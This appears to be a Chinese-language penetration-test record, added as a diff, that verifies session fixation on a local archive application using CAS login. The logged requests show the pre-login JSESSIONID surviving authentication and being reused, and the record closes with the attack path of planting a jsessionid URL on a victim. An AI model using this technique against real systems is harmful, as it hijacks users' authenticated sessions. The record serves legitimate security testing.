@@ -1,0 +1,34 @@
+# 测试点 3：会话固定 —— 实测记录
+# 时间 2026-10-28T20:53+08:00  环境 archive:8081 + CAS:8443
+
+[1] 登录前获取 session
+    GET http://localhost:8081/archive/index.action
+    Set-Cookie: JSESSIONID=B7E740A3E22D02325DDCB0E525507E04
+
+[2] 走 CAS 登录（sandbox/sandbox）
+    302 -> TGC 下发
+    302 -> /archive/j_spring_cas_security_check?ticket=ST-...
+    302 -> /archive/index.action?continue
+
+[3] 登录后查询自己的 session
+    GET http://localhost:8081/archive/whoami
+    {"session_id":"B7E740A3E22D02325DDCB0E525507E04","authenticated":true,"principal":"sandbox-user"}
+
+    结论：登录前后 session id 完全相同 → migrateSession() 未轮换
+
+[4] 攻击者持登录前 SID 复访
+    GET http://localhost:8081/archive/whoami
+    Cookie: JSESSIONID=B7E740A3E22D02325DDCB0E525507E04
+    {"session_id":"B7E740A3E22D02325DDCB0E525507E04","authenticated":true,"principal":"sandbox-user"}
+
+    结论：可直接复用，以 sandbox-user 身份通过
+
+[5] 对照组：伪造 SID
+    Cookie: JSESSIONID=FAKEFAKEFAKE
+    （无响应体，被重定向到 CAS）
+
+    结论：伪造无效，必须持有真实存在的、已被认证的 SID
+
+# 判定：会话固定成立。
+# 攻击路径：把 index.action;jsessionid=<攻击者SID> 发给受害者
+#          -> 受害者登录 -> 攻击者复用该 SID 即获得受害者身份
